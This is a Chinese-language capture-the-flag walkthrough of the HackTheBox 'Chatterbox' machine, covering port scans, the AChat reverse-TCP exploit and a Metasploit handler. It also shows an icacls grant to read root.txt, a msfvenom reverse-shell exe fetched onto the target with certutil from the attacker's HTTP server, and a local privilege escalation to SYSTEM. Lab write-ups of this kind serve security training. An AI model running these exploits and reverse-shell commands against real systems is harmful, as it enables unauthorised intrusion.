> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-KQvWOgyhjMs5si0CuE5xg)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcyalKSbsvL3VKvOJ05wYhiatxicMIkmeySB95Z8vsaZVDYpJFOElUia25w/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
 https://app.hackthebox.com/machines/Chatterbox
```

靶场: HackTheBox.com

靶机名称: Chatterbox

难度: 中等

提示信息:

```
 无
```

目标: user.txt 和 root.txt

实验环境
----

```
 攻击机:Kali 10.10.16.3
 
 靶机:10.10.10.74
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
 sudo masscan -p1-65535 -i tun0 --max-rate 1000
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcZdgnPcpWdPV2s0fZCfWTmcWfFYeSvuGVTibibCBPoa662tzQfnjgLgjw/640?wx_fmt=png)

```
 sudo nmap -sC -sV -p 135,139,445,9255,9256 10.10.10.74 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcRrHaBWY0cXQjWTgVf4ZJTocuibTgkCktxhVU2P0Wezlllaz6hwsl3rg/640?wx_fmt=png)

从扫描结果中看到操作系统是 win7 SP1 7601 版本，并开放 SMB 服务和 9255、9256（按靶机名字猜测是聊天室开放的端口），先来看看 SMB。

```
 rpcclient 10.10.10.74 -U ""
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlc2UTRvp0kSNeU4ibzwAMCETOdicmibWgzmC27rbUIyzgV9qQEazbYTsHBQ/640?wx_fmt=png)

```
 smbclient -L 10.10.10.74 -U '' -P ''
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlc3hGZNMlPEnetCElWibjiawcOTJnKghrtPgpBUSKcUibQ8SuicpYyutN7iaQ/640?wx_fmt=png)

```
sudo nmap --script smb-vuln* 10.10.10.74 -p 445 -oN NmapSMB.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcqcucZ8m9QsNJ4A9gKNAVV62e8UQiaHRJjuicX1Bp21xvkeQnibVicXX4JA/640?wx_fmt=png)

SMB 未发现可利用的信息，再来看看 9255 和 9256 两个端口是什么服务

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcM87ZQcDbT5Mz1LrGMpv7WKVRAGEoNADdzc3S69KAAfufHVbx4stdqQ/640?wx_fmt=png)

```
https://www.speedguide.net/port.php?port=9256
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlciaASoCHSV7gvlZkM8o8joyu9BCYz1EwEht1JiaefuSNerVia9btRnEVAw/640?wx_fmt=png)

通过搜索引擎发现是一个名为 AChat.exe 的程序运行的端口，来找找是否存在漏洞。

漏洞利用 (Exploitation)
-------------------

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlc33MwE3n4Pl3YJvnzVo9tjzd1xObribqOOhaLsEmvvTVAEdlnViadnBicQ/640?wx_fmt=png)

发现多个利用工具，找一个拿来试试

```
https://github.com/mpgn/AChat-Reverse-TCP-Exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlctdYGHOLzn9RuTVNZTh0adOnjEmYqO1m87iadTZyiaSSsxYDgjiaZdicSng/640?wx_fmt=png)

```
git clone https://github.com/mpgn/AChat-Reverse-TCP-Exploit.git
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcOdoaibichHmx1OxN7EHricuzrSP8IIQUuAV55hIdOH6Tv8HNiaxuoLzpOg/640?wx_fmt=png)

下载完成根据文档的内容生成 payload 并修改 EXP

```
./AChat_Payload.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlc2wPCfsGewyXdrrFam8efrliaHxD0GG9dQcPpgQ5iboevDNvibqicHWoUoQ/640?wx_fmt=png)

将生成的 payload 部分拷贝到 EXP 中

```
vim AChat_Exploit.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcNpT342DRGMVZPMb52UHRPRcyEvbc8KzjDLdCbFHWTnBWBibYkJZlQfA/640?wx_fmt=png)

将生成的 payload 替换这段内容，攻击机在 msf 中监听 4444 端口

```
msfconsole -q
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 10.10.16.4
set LPORT 4444
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcib0uKlrsIbQ14N4T3lN4xPC0JmrWZ5B50Col8gKicXmWiaSMcepm0qqPw/640?wx_fmt=png)

执行 EXP

```
py2 AChat_Exploit.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcA6iaEmn70dnyX1cAuU9wLRzjo9sm7ka7VKMaZbSRemdJZ91yXUSEQJQ/640?wx_fmt=png)

攻击成功，拿到 alfred 用户权限，来找找敏感信息

```
cd \users
tree /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcBhQITJaJ0fQquhYHLnu0cwjS4OicKvzlTPyRAdT6wibzwt1K2PM0OGHw/640?wx_fmt=png)

在 Alfred 和 Administrator 目录桌面上发现 flag 文件

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlczGrhpEDicZKW1ftOF2clYX7YAm0upxicjEg8kyRQ2EnsTxb2iaKuGuHzA/640?wx_fmt=png)

查看 user.txt 内容

```
type alfred\desktop\user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcIrfgnDiaeMsrgrqLDaWibou4gL99yuWxNb1TNEicfV05NhVvIGVuIGz5w/640?wx_fmt=png)

拿到用户 flag，管理员的文件没有权限访问，但是又能进入目录，看来 alfred 对 administrator 有一些权限，来具体看看是什么权限

```
cd administrator\desktop
dir /a /q
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlc5MzXzG3V2WZyhQmC9vVZUHcvBOsicaTaf8uFPOTVIdK8f4bHaS5p1Sw/640?wx_fmt=png)

Alfred 用户对 root.txt 文件是有权限的，具体哪些权限使用`icacls`检查

```
icacls官方文档
https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/icacls
```

```
icacls root.txt
icacls ../desktop
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcaFBgmvjS5icHQBh4xxgVRrEhG0N6cqYsY3sribibibqlStvUUu9icx3qRVw/640?wx_fmt=png)

使用 icacls 对 root.txt 文件检查发现 amdinistrator 有完全访问权限，对桌面文件夹检查发现 Alfred 有完全访问权限，尝试使用 icacls 对 root.txt 文件赋予 Alfred 完全访问权限

```
icacls root.txt /grant Alfred:(F)
icacls root.txt
type root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcUQw3Qqia4GBmRSGW6aV9se7iaYGE82WGIjKaG8ciaSAbDxWoGfhkoDrOQ/640?wx_fmt=png)

成功对 root.txt 添加 Alfred 用户权限并拿到 flag，游戏结束。

等等，只是拿到了 flag 还不够，还没有拿到这台机器的最高权限 SYSTEM。

提权 (Privilege Escalation)
-------------------------

msfvenom 生成后门上传到靶机执行反弹回到 msf 中

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=3333 -f exe > shell.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcPz1vibu767RWuzE5CAunpvku4acxZePnaHYwkwHEiasXM60EntWE1zGg/640?wx_fmt=png)

重新启动个 msf 监听 4444 端口

```
msfconsole -q
use exploit\mulit\handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.16.4
set LPORT 3333
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcYSJo8SwrniamDeTKbicBV9utL6XOKkItluhxfUFgbOYpbAwiaJ8ZWsQhw/640?wx_fmt=png)

攻击机在 shell.exe 目录下开启 HTTP 服务

```
py3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcC64euDkQZM0dS5tYMh8sIZwdMmktOCJnDB8cV0oluyoa79cqOZhWHw/640?wx_fmt=png)

靶机下载 shell.exe 并执行

```
cd \Users\Alfred
mkdir temp
cd temp
certutil -urlcache -split -f http://10.10.16.4:8000/shell.exe
shell.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlckI4B3UYIlrdPxOvXopE9TjhNFXOS9GHG50EKUNvEXibPHia8C49Qe8rA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcvCuOXgzKticBCGBrAOUiaH409JCMUbOR7LzZ3zNofJFLJibyMWQ0B313A/640?wx_fmt=png)

使用 local_exploit_suggester 模块检查提权漏洞

```
background
use post/multi/recon/local_exploit_suggester
set session 1
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcBcJTjfFibDVh3CcT63CoVHbzichTeEANCddOFDjHjhvawpj1j02icdqbg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlc3ovhGMmBtgwX10B3Kn2HCBkXicYsh7fY0cib2ZO9ec9lLVhlurWia3mJg/640?wx_fmt=png)

发现多个漏洞利用工具，选 exploit/windows/local/ntusermndragover 来攻击

```
use exploit/windows/local/ntusermndragover
set session 1
set LHOST 10.10.16.4
set LPORT 3333
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlckKvpAkNvlxAibRoLCKEpia8dqJNBT7N4AgmLQJqs7CfGuQ51dBxSsaMw/640?wx_fmt=png)

拿到 SYSTEM 权限，游戏结束。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcdqPQgdcZB1c29xibJricjb9B4icUFN3cRIEMxnlHx1bOIdQASnmJX5r5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcy3VtLsuFBKDib9TKrC2hT88XRibWdpCXYMukX01mCFZRicqKJKVwmEPXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUu8F64xD3iazgIJmGXBGXtlcVY4iclmrbYVSIagTHpfqIEL5AVrxuicps4ttrESa7AEMhvZuXOJ3eicOw/640?wx_fmt=jpeg)